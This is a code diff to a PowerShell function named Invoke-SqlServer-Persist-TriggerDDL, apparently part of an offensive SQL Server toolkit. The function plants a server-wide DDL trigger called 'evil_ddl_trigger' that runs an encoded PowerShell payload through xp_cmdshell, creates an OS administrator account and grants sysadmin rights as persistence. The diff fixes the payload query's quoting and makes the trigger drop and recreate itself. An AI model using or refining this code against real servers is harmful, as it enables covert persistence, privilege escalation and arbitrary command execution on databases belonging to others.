@@ -261,6 +261,7 @@ function Invoke-SqlServer-Persist-TriggerDDL
         
     # Close db connection
     $conn.Close()  
+
     if($SqlServeServiceAccount -eq "LocalSystem" -or $TableServiceAccountPriv -contains "$SqlServeServiceAccount"){
         Write-Host "[*] The service account $SqlServeServiceAccount has local administrator privileges."  
         $SvcAdmin = 1
@@ -295,17 +296,14 @@ function Invoke-SqlServer-Persist-TriggerDDL
         {
             Write-Host "PowerShell encoded payload is too long so the PowerShell command will not be added." -foreground "red"
         }else{
-            
-            # Open db connection
-            $conn.Open()
 
             # Create query
-            $Query_PsCommand = "EXEC master..xp_cmdshell ''PowerShell -enc $EncodedCommand''');" 
+            $Query_PsCommand = "EXEC master..xp_cmdshell ''PowerShell -enc $EncodedCommand'';" 
 
-            Write-Host "PowerShell payload generated." -foreground "green"
+            Write-Host "[*] Payload generated." -foreground "green"
         }
     }else{
-        Write-Host "[*] Note: The pscommand was not provided, so no PowerShell will be run." 
+        Write-Host "[*] Note: No PowerShell will be executed, because the parameters weren't provided." 
     }
 
     # -------------------
@@ -330,6 +328,8 @@ function Invoke-SqlServer-Persist-TriggerDDL
             # Status user
             Write-Host "[*] Payload generated." -foreground "green"
         }
+    }else{
+        Write-Host "[*] Note: No OS admin will be created, because the parameters weren't provided." 
     }
     
     # -----------------------
@@ -366,14 +366,13 @@ function Invoke-SqlServer-Persist-TriggerDDL
         $conn.Open()
 
         # Setup query 
-        $Query = "IF NOT EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'evil_ddl_trigger')
+        $Query = "IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'evil_ddl_trigger') 
+        DROP TRIGGER [evil_ddl_trigger] ON ALL SERVER
         exec('CREATE Trigger [evil_ddl_trigger] 
         on ALL Server
         For DDL_SERVER_LEVEL_EVENTS
         AS
         $Query_OsAddUser $Query_SysAdmin $Query_PsCommand')"
-
-        $Query
 
         $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
         $results = $cmd.ExecuteReader() 
